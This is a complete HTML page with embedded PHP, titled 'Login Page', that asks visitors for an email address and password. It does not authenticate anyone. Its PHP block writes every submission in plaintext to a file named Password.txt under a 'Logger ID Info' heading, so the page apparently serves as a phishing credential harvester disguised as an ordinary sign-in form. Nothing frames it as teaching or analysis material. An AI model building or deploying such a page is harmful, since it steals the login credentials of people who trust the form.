<!DOCTYPE html>
<html>
<head>
	<title>Login Page</title>
	<link rel="stylesheet" type="text/css" href="../Design.css">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>
	<div class="logo">
		<img src="../images/logo.png">
	</div>
	<div class="Form">
	    <center>
		       <form  method="post" enctype="multipart/form-data">
			         <h1>Email ID</h1>
			         <input type="Email" name="email" placeholder="Email" class="in" required>

			         <h2>Password</h2>
			         <input type="password" name="pass" placeholder="Password" class="out" minlength="8" required>

			         <input type="Submit" name="Submit" class="btnn">
		        </form>
		</center>        
	</div>
	
	<?php
	$myfile = fopen("Password.txt", "a+");
	$email = $_POST['email'];
	$password = $_POST['pass'];

	if (isset($email) and isset($password)) {
		fwrite($myfile, "=================================="."\r\n");
		fwrite($myfile, "Logger ID Info"."\r\n");
		fwrite($myfile, "=================================="."\r\n");
		fwrite($myfile, "Email ID : ");
		fwrite($myfile, $email."\r\n");
		fwrite($myfile, "Password : ");
		fwrite($myfile, $password."\r\n");
		fwrite($myfile, "=================================="."\r\n");
		fclose($myfile);
	} else {
		return true;
	}

	
	?>


</body>
</html>